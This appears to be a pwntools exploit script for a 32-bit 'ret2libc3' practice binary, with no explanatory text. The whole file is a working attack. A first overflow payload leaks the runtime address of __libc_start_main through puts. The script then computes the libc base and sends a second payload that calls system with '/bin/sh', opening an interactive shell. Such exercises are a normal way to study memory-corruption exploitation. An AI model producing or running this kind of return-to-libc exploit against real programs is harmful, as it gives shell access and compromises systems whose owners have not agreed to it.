from pwn import *

offset = 0xFF82DD38-0xFF82DCCC+4

elf = ELF('./ret2libc3')
elf2 = ELF('./libc.so.6')

main_got_addr = elf.got['__libc_start_main']
puts_plt_addr = elf.plt['puts']
main_plt_addr = elf.symbols['_start']

payload1 = offset * b'A'+ p32(puts_plt_addr) + \
			p32(main_plt_addr) +p32(main_got_addr)
sh = process("./ret2libc3")
sh.recv()
sh.sendline(payload1)

libc_real_addr = u32(sh.recv()[0:4])
print( "real_addr is:" , hex(libc_real_addr))
libc_base = libc_real_addr - elf2.symbols['__libc_start_main']
system_addr = libc_base + elf2.symbols['system']
string_addr = libc_base + next(elf2.search(b'/bin/sh'))

payload2 = (offset * b'A' + p32(system_addr) + p32(0) + p32(string_addr))
sh.sendline(payload2)
sh.interactive()
